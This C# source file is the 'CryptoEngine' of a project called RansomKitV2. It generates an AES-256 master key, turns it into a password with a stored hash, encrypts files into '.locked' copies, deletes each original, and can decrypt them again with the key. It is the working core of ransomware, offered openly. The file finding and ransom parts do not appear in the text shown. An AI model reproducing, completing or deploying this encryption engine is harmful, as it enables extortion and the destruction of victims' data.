using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace RansomKitV2
{
    static class CryptoEngine
    {


        static byte[]? SafeFromBase64(string? input)
{
    if (string.IsNullOrWhiteSpace(input)) return null;

    // strip all whitespace — handles newlines, spaces, wrapped strings
    string clean = System.Text.RegularExpressions.Regex.Replace(input, @"\s+", "");

    // base64 length must be multiple of 4 after cleanup
    int padding = (4 - clean.Length % 4) % 4;
    clean = clean + new string('=', padding);

    try   { return Convert.FromBase64String(clean); }
    catch { return null; }
}
        public const string LOCKED_EXT = ".locked";

        // File format: [16-byte IV] [N-byte AES-256-CBC ciphertext]
        // Each file gets a unique IV derived from the master key + file path hash
        // so even identical plaintext encrypts differently per file.

        // ── Key generation ────────────────────────────────────────────────────

        /// <summary>Generate a cryptographically random 256-bit master key.</summary>
        public static byte[] GenerateMasterKey()
        {
            byte[] key = new byte[32];
            RandomNumberGenerator.Fill(key);
            return key;
        }

        /// <summary>
        /// Encode master key as a URL-safe Base64 string (no padding issues,
        /// no line breaks, no + or / that confuse consoles).
        /// Result is always exactly 43 chars.
        /// </summary>
        public static string MasterKeyToPassword(byte[] masterKey)
            => Base64UrlEncode(masterKey);

        /// <summary>
        /// Decode a password string back to raw key bytes.
        /// Returns null if the string is invalid — never throws.
        /// </summary>
        public static byte[]? PasswordToMasterKey(string? password)
        {
            if (string.IsNullOrWhiteSpace(password)) return null;
            return Base64UrlDecode(password.Trim());
        }

        /// <summary>SHA-256 of the master key, encoded as URL-safe Base64.</summary>
        public static string HashMasterKey(byte[] masterKey)
            => Base64UrlEncode(SHA256.HashData(masterKey));

        /// <summary>
        /// Verify a password matches a stored hash.
        /// Returns false (not throws) on any format error.
        /// </summary>
        public static bool VerifyPassword(string password, string storedHash)
        {
            byte[]? key = PasswordToMasterKey(password);
            if (key == null || key.Length != 32) return false;

            byte[]? hash = Base64UrlDecode(storedHash.Trim());
            if (hash == null) return false;

            byte[] candidate = SHA256.HashData(key);
            return CryptographicOperations.FixedTimeEquals(candidate, hash);
        }

        // ── File encryption ───────────────────────────────────────────────────

        /// <summary>
        /// Encrypt <paramref name="plainPath"/> with AES-256-CBC.
        /// Output written to <paramref name="plainPath"/> + LOCKED_EXT.
        /// Original deleted on success.
        /// </summary>
        public static bool EncryptFile(string plainPath, byte[] masterKey)
        {
            try
            {
                string lockedPath = plainPath + LOCKED_EXT;

                // Per-file IV: deterministic from master key + path so we can
                // always re-derive it, but unique per file.
                byte[] iv = DeriveIV(masterKey, plainPath);

                using var aes = Aes.Create();
                aes.Key = masterKey;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using var fsIn = new FileStream(plainPath, FileMode.Open, FileAccess.Read, FileShare.Read);
                using var fsOut = new FileStream(lockedPath, FileMode.Create, FileAccess.Write, FileShare.None);

                // Write IV header
                fsOut.Write(iv, 0, iv.Length);

                using var enc = aes.CreateEncryptor();
                using var cs = new CryptoStream(fsOut, enc, CryptoStreamMode.Write);
                fsIn.CopyTo(cs);
                cs.FlushFinalBlock();

                fsIn.Close();
                fsOut.Close();

                // Wipe original
                File.Delete(plainPath);
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Decrypt a .locked file back to its original path.
        /// Original .locked file deleted on success.
        /// </summary>
        public static bool DecryptFile(string lockedPath, byte[] masterKey)
        {
            try
            {
                if (!lockedPath.EndsWith(LOCKED_EXT, StringComparison.OrdinalIgnoreCase))
                    return false;

                string plainPath = lockedPath[..^LOCKED_EXT.Length];

                using var fsIn = new FileStream(lockedPath, FileMode.Open, FileAccess.Read, FileShare.Read);

                // Read IV header
                byte[] iv = new byte[16];
                if (fsIn.Read(iv, 0, 16) != 16) return false;

                using var aes = Aes.Create();
                aes.Key = masterKey;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using var fsOut = new FileStream(plainPath, FileMode.Create, FileAccess.Write, FileShare.None);
                using var dec = aes.CreateDecryptor();
                using var cs = new CryptoStream(fsIn, dec, CryptoStreamMode.Read);
                cs.CopyTo(fsOut);

                fsIn.Close();
                fsOut.Close();

                File.Delete(lockedPath);
                return true;
            }
            catch
            {
                return false;
            }
        }

        // ── Helpers ───────────────────────────────────────────────────────────

        /// <summary>
        /// Derive a 16-byte AES IV from the master key and a per-file salt (the path).
        /// Uses HKDF-Expand so each file gets a unique, deterministic IV.
        /// </summary>
        static byte[] DeriveIV(byte[] masterKey, string filePath)
        {
            byte[] info = Encoding.UTF8.GetBytes(Path.GetFullPath(filePath));
            return HKDF.DeriveKey(HashAlgorithmName.SHA256, masterKey, 16, info: info);
        }

        // ── URL-safe Base64 (RFC 4648 §5) ────────────────────────────────────
        // Standard Base64 uses + and / which cause issues in console copy-paste.
        // URL-safe uses - and _ instead, no line breaks, no padding confusion.

        static string Base64UrlEncode(byte[] data)
        {
            // Convert.ToBase64String WITHOUT InsertLineBreaks, then swap chars
            return Convert.ToBase64String(data)   // standard, no line breaks
                          .TrimEnd('=')            // strip padding (deterministic)
                          .Replace('+', '-')
                          .Replace('/', '_');
        }

        static byte[]? Base64UrlDecode(string s)
        {
            try
            {
                // Restore standard base64
                string std = s.Replace('-', '+')
                              .Replace('_', '/')
                              .Trim();             // strip any accidental whitespace

                // Re-add padding so length is a multiple of 4
                switch (std.Length % 4)
                {
                    case 2: std += "=="; break;
                    case 3: std += "="; break;
                }

                return Convert.FromBase64String(std);
            }
            catch
            {
                return null;
            }
        }
    }
}